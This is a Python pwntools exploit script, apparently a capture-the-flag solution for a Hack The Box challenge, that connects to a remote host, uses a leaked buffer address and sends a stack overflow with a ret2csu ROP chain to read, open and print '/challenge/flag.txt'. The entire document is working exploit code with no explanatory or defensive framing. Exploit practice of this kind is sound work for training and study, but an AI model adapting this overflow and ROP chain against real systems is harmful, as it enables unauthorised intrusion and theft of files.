#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
ret_gadget = 0x401016
csu_pop = 0x401512
csu_call = 0x4014f8
got_read = 0x403250
got_open = 0x403278
bss_path = 0x404100
bss_data = 0x404200

# Full chain: read(path→bss) + open(bss) + read(fd→bss2) + puts(bss2)
# With alignment rets
path = b'/challenge/flag.txt\x00'
pad = b'A' * 64 + b'B' * 8
rop = b''

# 1) CSU read(0, bss_path, 32)
rop += p64(ret_gadget)
rop += p64(csu_pop)
rop += p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(32) + p64(got_read)
rop += p64(csu_call)
rop += p64(0) + p64(0)*6

# 2) CSU open(bss_path, 0, 0)
rop += p64(csu_pop)
rop += p64(0) + p64(1) + p64(bss_path) + p64(0) + p64(0) + p64(got_open)
rop += p64(csu_call)
rop += p64(0) + p64(0)*6

# 3) CSU read(3, bss_data, 0x100)
rop += p64(csu_pop)
rop += p64(0) + p64(1) + p64(3) + p64(bss_data) + p64(0x100) + p64(got_read)
rop += p64(csu_call)
rop += p64(0) + p64(0)*6

# 4) puts(bss_data) + main
rop += p64(pop_rdi) + p64(bss_data)
rop += p64(0x401040)
rop += p64(0x401393)

payload = pad + rop + path
print(f'Payload: {len(payload)}B (pad={len(pad)}, rop={len(rop)}, path={len(path)})')
r.send(payload)

import time
time.sleep(0.5)
r.send(path)  # Send path data for CSU read into bss_path
time.sleep(1)
data = r.recv(timeout=5).strip()
print(f'Result: {data[:400]}')
if b'{' in data:
    flag = data[data.index(b'{'):data.index(b'}')+1]
    print(f'FLAG: HTB{{{flag[1:-1].decode()}}}')
r.close()
